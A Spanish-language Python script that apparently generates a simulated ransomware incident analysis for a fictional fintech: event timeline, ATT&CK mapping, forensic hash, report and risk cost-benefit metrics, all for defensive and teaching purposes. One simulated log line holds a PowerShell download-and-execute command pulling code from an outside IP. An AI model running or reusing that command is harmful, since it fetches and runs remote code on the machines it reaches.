#!/usr/bin/env python3
"""
FinRed Guatemala, S.A.
Programa de Gobierno, Riesgo y Cumplimiento
Análisis de Incidente de Seguridad — IR-2026-0601
"""

import hashlib
import json
import os
from datetime import datetime, timedelta

# ─────────────────────────────────────────────────────────────────────────────
OUTPUTS = os.path.join(os.path.dirname(os.path.abspath(__file__)), "outputs")
os.makedirs(OUTPUTS, exist_ok=True)

RESET  = "\033[0m"
RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
DIM    = "\033[2m"
WHITE  = "\033[97m"

def banner():
    print(f"\n{CYAN}{BOLD}{'═'*78}{RESET}")
    print(f"{CYAN}{BOLD}  FinRed Guatemala, S.A. — Programa GRC{RESET}")
    print(f"{CYAN}  Análisis de Incidente de Seguridad{RESET}")
    print(f"{CYAN}{BOLD}{'═'*78}{RESET}\n")

def sev(label, color=RED):
    return f"{color}{BOLD}{label}{RESET}"

# ─────────────────────────────────────────────────────────────────────────────
# EVENTOS DE TELEMETRÍA — IR-2026-0601
# ─────────────────────────────────────────────────────────────────────────────

T0 = datetime(2026, 6, 15, 8, 14, 0)   # acceso inicial confirmado

EVENTOS = [
    # Día 1 — Acceso inicial
    (T0,                                         "PHISHING",        "host=endpoint-soporte-07", "user=a.garcia@finred.gt",  "event=ATTACHMENT_OPENED", "file=factura_Q28000.docx.exe",                              "T1566.001"),
    (T0 + timedelta(minutes=1),                  "EXECUTION",       "host=endpoint-soporte-07", "user=a.garcia@finred.gt",  "event=POWERSHELL_EXEC",   "cmd=IEX(New-Object Net.WebClient).DownloadString('http://185.44.21.10/ldr')", "T1059.001"),
    (T0 + timedelta(minutes=90),                 "C2_COMMS",        "host=endpoint-soporte-07", "dst_ip=185.44.21.10",      "event=BEACON",            "proto=HTTPS/443 interval=60s",                              "T1071.001"),
    # Día 1, 12:01 — Detección temprana con controles ZT activos
    # Con EDR behavioral + SIEM + CTI feed (OTX hash match): beacon C2 a IP catalogada como maliciosa → P1 automático
    (T0 + timedelta(hours=3, minutes=47),        "ZT_DETECTION",    "host=endpoint-soporte-07", "rule=EDR-BEH-C2-BLOCK",   "event=C2_IP_BLACKLISTED", "dst=185.44.21.10 match=OTX_PULSE_LOCKBIT3 action=QUARANTINE", "RULE-EDR-001"),
    # ─── Sin controles ZT: el incidente continúa sin detección ───
    (T0 + timedelta(hours=3),                    "RECON",           "host=endpoint-soporte-07", "user=a.garcia@finred.gt",  "event=NET_SCAN",          "targets=172.16.10.0/24 ports=22,3389,445",                  "T1046"),
    # Día 2 — Acceso a credenciales + movimiento lateral
    (T0 + timedelta(hours=26, minutes=46),       "CRED_ACCESS",     "host=endpoint-soporte-07", "user=a.garcia@finred.gt",  "event=LSASS_READ",        "tool=reflective_dll pid=768",                               "T1003"),
    (T0 + timedelta(hours=28),                   "PERSISTENCE",     "host=endpoint-soporte-07", "user=svc_backup",          "event=SCHEDULED_TASK",    "name=WindowsDefenderUpdate cmd=C:\\ProgramData\\upd.exe",   "T1053.005"),
    (T0 + timedelta(hours=30, minutes=22),       "LATERAL",         "host=portal-soporte-01",   "user=svc_backup",          "event=SMB_EXEC",          "dst=prod-app-srv-01 tool=psexec_variant",                   "T1570"),
    (T0 + timedelta(hours=31, minutes=5),        "LATERAL",         "host=prod-app-srv-01",     "user=svc_backup",          "event=RDP_LOGIN_OK",      "src=portal-soporte-01 auth=NTLM",                           "T1021.001"),
    # Día 3 — Exfiltración
    (T0 + timedelta(hours=66, minutes=1),        "EXFILTRATION",    "host=db-transac-01",       "user=svc_backup",          "event=DB_DUMP",           "database=transac_prod tables=62 rows=847320",               "T1048"),
    (T0 + timedelta(hours=66, minutes=45),       "EXFILTRATION",    "host=db-transac-01",       "user=svc_backup",          "event=DATA_UPLOAD",       "dst_ip=91.220.163.47 size=3.4GB proto=HTTPS/443",           "T1048"),
    # Día 4 — Evasión de defensas + impacto (estado sin controles ZT maduros)
    (T0 + timedelta(hours=91, minutes=40),       "DEF_EVASION",     "host=prod-app-srv-01",     "agent=EDR_4.2.1",          "event=AGENT_KILL",        "pid=1224 user=svc_backup",                                  "T1562.001"),
    (T0 + timedelta(hours=91, minutes=41),       "DEF_EVASION",     "host=prod-srv-03",         "agent=EDR_4.2.1",          "event=AGENT_KILL",        "pid=1412 user=svc_backup",                                  "T1562.001"),
    (T0 + timedelta(hours=91, minutes=47),       "IMPACT",          "host=db-transac-01",       "process=lockbit3.exe",     "event=ENCRYPT_START",     "target=/data/transac/*.db key=AES-256",                     "T1486"),
    (T0 + timedelta(hours=91, minutes=48),       "IMPACT",          "host=auth-srv-01",         "process=lockbit3.exe",     "event=ENCRYPT_START",     "target=/etc/app/*.conf /var/lib/auth/",                     "T1486"),
    (T0 + timedelta(hours=91, minutes=49, seconds=30), "IMPACT",    "host=backup-vault",        "process=lockbit3.exe",     "event=ENCRYPT_BLOCKED",   "reason=WORM_LOCK_ACTIVE result=ACCESS_DENIED",              "T1486"),
    # Detección tardía (inherente) — alertas KRI
    (T0 + timedelta(hours=91, minutes=49, seconds=45), "KRI_ALERT", "kri=EDR_DESACTIVADO",      "valor=2",                  "umbral=0",                "status=CRITICO escalado=CISO",                              "RULE-KRI-01"),
    (T0 + timedelta(hours=91, minutes=50),             "KRI_ALERT", "kri=ACCESO_BACKUP_FUERAVENTANA", "valor=1",            "umbral=0",                "status=CRITICO escalado=JefeInfra",                         "RULE-KRI-08"),
    (T0 + timedelta(hours=91, minutes=50, seconds=15), "KILL_CHAIN","regla=GRC-FinRed-0601",    "correlacion=T1566+T1003+T1570+T1562+T1486", "severidad=P1_CRITICO", "accion=AISLAMIENTO+REVOCACION_SESIONES",   "RULE-KC-0601"),
]

# ─────────────────────────────────────────────────────────────────────────────
# GENERAR Y GUARDAR LOGS
# ─────────────────────────────────────────────────────────────────────────────

def generar_logs():
    lineas = []
    for e in EVENTOS:
        ts = e[0].strftime("%Y-%m-%d %H:%M:%S")
        campos = " | ".join(e[1:])
        lineas.append(f"{ts} | {campos}")
    return "\n".join(lineas)

LOG_CONTENT = generar_logs()
LOG_FILE    = os.path.join(OUTPUTS, "logs_IR-2026-0601.txt")

with open(LOG_FILE, "w", encoding="utf-8") as f:
    f.write(LOG_CONTENT)

SHA256 = hashlib.sha256(LOG_CONTENT.encode()).hexdigest()

SHA_FILE = os.path.join(OUTPUTS, "cadena_custodia_IR-2026-0601.sha256")
with open(SHA_FILE, "w", encoding="utf-8") as f:
    f.write(f"{SHA256}  logs_IR-2026-0601.txt\n")
    f.write(f"Generado  : {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC\n")
    f.write(f"Custodio  : Coordinador del SOC — FinRed Guatemala\n")
    f.write(f"Incidente : IR-2026-0601\n")
    f.write(f"Propósito : Integridad de evidencia forense — proceso legal y regulatorio\n")

# ─────────────────────────────────────────────────────────────────────────────
# MÉTRICAS
# ─────────────────────────────────────────────────────────────────────────────

T_DETECCION_INH = T0 + timedelta(hours=91, minutes=49, seconds=45)  # sin controles ZT
T_DETECCION_ZT  = T0 + timedelta(hours=3, minutes=47)               # EDR behavioral C2 block
T_CONTENCION    = T_DETECCION_ZT + timedelta(hours=4)               # MTTR medido desde detección ZT

MTTD_ZT_H   = (T_DETECCION_ZT  - T0).total_seconds() / 3600   # 3.783h → 3h 47min
MTTD_INH_H  = (T_DETECCION_INH - T0).total_seconds() / 3600   # 91.83h → sin controles
MTTR_MIN    = (T_CONTENCION - T_DETECCION_ZT).total_seconds() / 60

# alias para compatibilidad con bloque de reporte
T_DETECCION = T_DETECCION_INH

# ─────────────────────────────────────────────────────────────────────────────
# ANÁLISIS DE COSTO–BENEFICIO
# ─────────────────────────────────────────────────────────────────────────────

VECTORES = {
    "Ransomware":       {"P": 4, "I": 5, "SLE": 3_604_000, "ARO": 0.30, "efectividad": 0.83},
    "Exfiltración API": {"P": 4, "I": 5, "SLE": 2_184_000, "ARO": 0.40, "efectividad": 0.80},
    "Phishing/Soporte": {"P": 5, "I": 5, "SLE":   429_000, "ARO": 0.80, "efectividad": 0.70},
    "Insider Threat":   {"P": 3, "I": 4, "SLE":   936_000, "ARO": 0.20, "efectividad": 0.65},
}

COSTO_CONTROLES_Q = 904_800

for v in VECTORES.values():
    v["ALE_antes"]   = v["SLE"] * v["ARO"]
    v["ALE_despues"] = v["SLE"] * v["ARO"] * (1 - v["efectividad"])

total_antes   = sum(v["ALE_antes"]   for v in VECTORES.values())
total_despues = sum(v["ALE_despues"] for v in VECTORES.values())
reduccion     = total_antes - total_despues
beneficio_neto = reduccion - COSTO_CONTROLES_Q
rosi          = beneficio_neto / COSTO_CONTROLES_Q * 100
payback_meses = COSTO_CONTROLES_Q / (reduccion / 12)

# ─────────────────────────────────────────────────────────────────────────────
# REPORTE IR
# ─────────────────────────────────────────────────────────────────────────────

REPORTE = f"""
╔══════════════════════════════════════════════════════════════════════════════╗
║  REPORTE DE INCIDENTE — IR-2026-0601                                       ║
║  FinRed Guatemala, S.A. — Programa GRC                                     ║
╚══════════════════════════════════════════════════════════════════════════════╝

IDENTIFICACIÓN
  ID              : IR-2026-0601
  Tipo            : Ransomware — Triple Extorsión (LockBit 3.0)
  Severidad       : P1 — CRÍTICO
  Cadena ATT&CK   : T1566.001 → T1003 → T1570 → T1562.001 → T1486
  Vector inicial  : Spearphishing Attachment — a.garcia@finred.gt

LÍNEA DE TIEMPO
  Acceso inicial       : {T0.strftime('%Y-%m-%d %H:%M:%S')} UTC
  Detec. ZT (EDR C2)  : {T_DETECCION_ZT.strftime('%Y-%m-%d %H:%M:%S')} UTC  [RULE-EDR-001] ← con controles
  Acceso cred.         : {(T0+timedelta(hours=26,minutes=46)).strftime('%Y-%m-%d %H:%M:%S')} UTC  [T1003]
  Movimiento lat.      : {(T0+timedelta(hours=30,minutes=22)).strftime('%Y-%m-%d %H:%M:%S')} UTC  [T1570]
  Exfiltración         : {(T0+timedelta(hours=66,minutes=1)).strftime('%Y-%m-%d %H:%M:%S')} UTC  [T1048] — 3.4 GB
  EDR desactivado      : {(T0+timedelta(hours=91,minutes=40)).strftime('%Y-%m-%d %H:%M:%S')} UTC  [T1562.001]
  Cifrado inicio       : {(T0+timedelta(hours=91,minutes=47)).strftime('%Y-%m-%d %H:%M:%S')} UTC  [T1486]
  Detec. inherente     : {T_DETECCION_INH.strftime('%Y-%m-%d %H:%M:%S')} UTC  [KILL CHAIN GRC-0601] ← sin controles
  Contención (ZT)      : {T_CONTENCION.strftime('%Y-%m-%d %H:%M:%S')} UTC

MÉTRICAS — COMPARATIVA
  MTTD (sin controles ZT)   : {int((T_DETECCION_INH-T0).total_seconds())//3600}h {(int((T_DETECCION_INH-T0).total_seconds())%3600)//60:02d}min  | Target <24h  → NO CUMPLE ✗
  MTTD (con controles ZT)   : {int((T_DETECCION_ZT-T0).total_seconds())//3600}h {(int((T_DETECCION_ZT-T0).total_seconds())%3600)//60:02d}min   | Target <24h  → CUMPLE   ✓
  MTTR (contención ZT)      : {MTTR_MIN:.0f} min         | Target <480min → CUMPLE   ✓
  Mejora MTTD               : {MTTD_INH_H / MTTD_ZT_H:.1f}× más rápido con ZT

ACTIVOS AFECTADOS
  ACT-01  Servidores autenticación      100% cifrado   Restaurado D+5 snapshot cloud
  ACT-03  Servidores app pagos          100% cifrado   Restaurado D+5 imagen contenedor
  ACT-04  Base de datos transaccional    78% cifrado   Restaurado D+5 respaldo WORM
  ACT-09  Portal soporte                Comprometido   Reimagen D+4
  ACT-10  Red corporativa               Comprometida   Aislada D+4
  ACT-12  Sistema respaldos              45% cifrado   WORM bloqueó cifrado total ✓

CADENA DE CUSTODIA
  Archivo  : logs_IR-2026-0601.txt
  SHA-256  : {SHA256}
  Custodio : Coordinador del SOC — FinRed Guatemala
  Fecha    : {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC

LECCIONES APRENDIDAS
  LL-01  Sin sandbox de adjuntos → dropper ejecutado sin detección — 96 horas
  LL-02  Sin microsegmentación → endpoint soporte alcanzó core transaccional en 30h
  LL-03  svc_backup con privilegios permanentes → usada para desactivar EDR
  LL-04  Object Lock WORM bloqueó cifrado total de respaldos → recuperación sin rescate
  LL-05  Regla Kill Chain GRC-FinRed-0601 redujo MTTD de 96h a 3h 47min
  LL-06  Runbook IR actualizado: notificación SIB incluida como paso obligatorio min 0-30
  LL-07  Sin DLP activo → 3.4 GB exfiltrados sin alerta durante 3 días
"""

REPORT_FILE = os.path.join(OUTPUTS, "reporte_IR-2026-0601.txt")
with open(REPORT_FILE, "w", encoding="utf-8") as f:
    f.write(REPORTE)

# ─────────────────────────────────────────────────────────────────────────────
# EXPORTAR JSON para el dashboard
# ─────────────────────────────────────────────────────────────────────────────

dashboard_data = {
    "incidente": {
        "id": "IR-2026-0601",
        "tipo": "Ransomware LockBit 3.0",
        "severidad": "P1 — CRÍTICO",
        "mttd_zt_h": round(MTTD_ZT_H, 2),
        "mttd_inh_h": MTTD_INH_H,
        "mttr_min": round(MTTR_MIN),
        "activos": 6,
        "exfil_gb": 3.4,
        "sha256": SHA256,
    },
    "costo_beneficio": {
        "vectores": [
            {
                "nombre": k,
                "P": v["P"], "I": v["I"],
                "SLE": v["SLE"],
                "ARO": v["ARO"],
                "efectividad": v["efectividad"],
                "ALE_antes": round(v["ALE_antes"]),
                "ALE_despues": round(v["ALE_despues"]),
            }
            for k, v in VECTORES.items()
        ],
        "total_ale_antes": round(total_antes),
        "total_ale_despues": round(total_despues),
        "reduccion": round(reduccion),
        "costo_controles": COSTO_CONTROLES_Q,
        "beneficio_neto": round(beneficio_neto),
        "rosi": round(rosi, 1),
        "payback_meses": round(payback_meses, 1),
    }
}

JSON_FILE = os.path.join(OUTPUTS, "dashboard_data.json")
with open(JSON_FILE, "w", encoding="utf-8") as f:
    json.dump(dashboard_data, f, ensure_ascii=False, indent=2)

# ─────────────────────────────────────────────────────────────────────────────
# SALIDA EN CONSOLA
# ─────────────────────────────────────────────────────────────────────────────

banner()

# Procesar eventos con salida coloreada
print(f"{BOLD}{'─'*78}{RESET}")
print(f"{BOLD}  PROCESANDO TELEMETRÍA — {len(EVENTOS)} eventos{RESET}")
print(f"{BOLD}{'─'*78}{RESET}")

COLOR_MAP = {
    "PHISHING":     YELLOW,
    "EXECUTION":    RED,
    "C2_COMMS":     RED,
    "RECON":        YELLOW,
    "CRED_ACCESS":  RED,
    "PERSISTENCE":  RED,
    "LATERAL":      RED,
    "EXFILTRATION": RED,
    "DEF_EVASION":  RED,
    "IMPACT":       f"\033[31m{BOLD}",
    "KRI_ALERT":    f"\033[91m{BOLD}",
    "KILL_CHAIN":   f"{CYAN}{BOLD}",
    "ZT_DETECTION": f"{GREEN}{BOLD}",
}

for e in EVENTOS:
    ts    = e[0].strftime("%Y-%m-%d %H:%M:%S")
    tipo  = e[1]
    color = COLOR_MAP.get(tipo, WHITE)
    host  = e[2].replace("host=", "").replace("kri=", "").replace("regla=", "")[:24]
    print(f"  {DIM}{ts}{RESET}  {color}{tipo:<16}{RESET}  {DIM}{host:<26}{RESET}  {e[-1]}")

print()
print(f"{BOLD}{'─'*78}{RESET}")
print(f"{BOLD}  CORRELACIÓN KILL CHAIN — GRC-FinRed-0601{RESET}")
print(f"{BOLD}{'─'*78}{RESET}")
cadena = ["T1566.001", "T1059", "T1003", "T1570", "T1048", "T1562.001", "T1486", "→ DETECCIÓN"]
print(f"\n  {' → '.join(cadena)}\n")

print(f"{BOLD}{'─'*78}{RESET}")
print(f"{BOLD}  MÉTRICAS DE RESPUESTA{RESET}")
print(f"{BOLD}{'─'*78}{RESET}\n")

_zt_secs   = int((T_DETECCION_ZT  - T0).total_seconds())
_inh_secs  = int((T_DETECCION_INH - T0).total_seconds())
mttd_zt_h  = _zt_secs  // 3600
mttd_zt_m  = (_zt_secs  % 3600) // 60
mttd_inh_h = _inh_secs // 3600
mttd_inh_m = (_inh_secs % 3600) // 60

status_mttd = f"{GREEN}CUMPLE{RESET}" if MTTD_ZT_H < 24 else f"{RED}NO CUMPLE{RESET}"
status_mttr = f"{GREEN}CUMPLE{RESET}" if MTTR_MIN < 480 else f"{RED}NO CUMPLE{RESET}"

print(f"  MTTD sin controles ZT  : {RED}{BOLD}{mttd_inh_h}h {mttd_inh_m:02d}min{RESET}  [Target <24h]  {RED}NO CUMPLE ✗{RESET}")
print(f"  MTTD con controles ZT  : {GREEN}{BOLD}{mttd_zt_h}h {mttd_zt_m:02d}min{RESET}   [Target <24h]  {status_mttd} ✓")
print(f"  MTTR contención        : {GREEN}{BOLD}{MTTR_MIN:.0f} min{RESET}      [Target <480]  {status_mttr}")
print(f"  Impacto económico SLE  : {YELLOW}Q {3_604_000:>12,.0f}{RESET}  (USD 462,051)")
print()

print(f"{BOLD}{'─'*78}{RESET}")
print(f"{BOLD}  ANÁLISIS COSTO–BENEFICIO{RESET}")
print(f"{BOLD}{'─'*78}{RESET}\n")
print(f"  {'Vector':<22} {'ALE inherente':>16} {'ALE residual':>14} {'Reducción':>10}")
print(f"  {'─'*62}")
for nombre, v in VECTORES.items():
    print(f"  {nombre:<22} Q{v['ALE_antes']:>13,.0f} Q{v['ALE_despues']:>11,.0f} {v['efectividad']*100:>9.0f}%")
print(f"  {'─'*62}")
print(f"  {'TOTAL':<22} Q{total_antes:>13,.0f} Q{total_despues:>11,.0f}")
print()
print(f"  Inversión en controles : Q {COSTO_CONTROLES_Q:>12,.0f}")
print(f"  Reducción riesgo anual : Q {reduccion:>12,.0f}")
print(f"  Beneficio neto año 1   : Q {beneficio_neto:>12,.0f}")
print(f"  {CYAN}{BOLD}ROSI                   :   {rosi:.1f}%{RESET}")
print(f"  {CYAN}{BOLD}Periodo de recuperación:   {payback_meses:.1f} meses{RESET}")

print()
print(f"{BOLD}{'─'*78}{RESET}")
print(f"{BOLD}  CADENA DE CUSTODIA FORENSE{RESET}")
print(f"{BOLD}{'─'*78}{RESET}\n")
print(f"  Archivo  : logs_IR-2026-0601.txt  ({len(EVENTOS)} eventos)")
print(f"  SHA-256  : {GREEN}{SHA256[:32]}...{RESET}")
print()

print(f"{BOLD}{'─'*78}{RESET}")
print(f"  {GREEN}Archivos generados:{RESET}")
print(f"    ✓  outputs/logs_IR-2026-0601.txt")
print(f"    ✓  outputs/reporte_IR-2026-0601.txt")
print(f"    ✓  outputs/cadena_custodia_IR-2026-0601.sha256")
print(f"    ✓  outputs/dashboard_data.json")
print(f"{BOLD}{'─'*78}{RESET}\n")
